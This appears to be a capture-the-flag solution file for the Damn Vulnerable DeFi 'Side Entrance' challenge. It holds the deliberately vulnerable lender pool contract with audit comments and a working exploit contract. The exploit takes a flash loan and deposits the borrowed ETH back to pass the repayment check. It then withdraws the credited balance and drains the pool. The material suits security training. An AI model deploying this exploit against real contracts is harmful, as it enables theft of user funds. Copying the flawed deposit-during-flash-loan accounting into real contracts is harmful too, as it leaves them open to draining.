// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping(address => uint256) private balances;

    //@audit-ok - simple and not buggy
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    //the attack cannto be possible simply using only the flashLoan
    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");

        //@audit-issue - Interface is not defined and used directly
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(
            address(this).balance >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
}

contract SideEntranceLenderPoolSolution {
    //
    SideEntranceLenderPool public victimContract;

    // uint AMOUNT = 1000 ether;

    constructor(address payable target) {
        victimContract = SideEntranceLenderPool(target);
    }

    function print() public pure returns (uint) {
        return 1000 ether;
    }

    function initiate_attack(uint amount) public {
        victimContract.flashLoan(amount);
    }

    function execute() external payable {
        victimContract.deposit{value: msg.value}();
    }

    function complete_attack() public {
        victimContract.withdraw();
    }

    receive() external payable {}
}
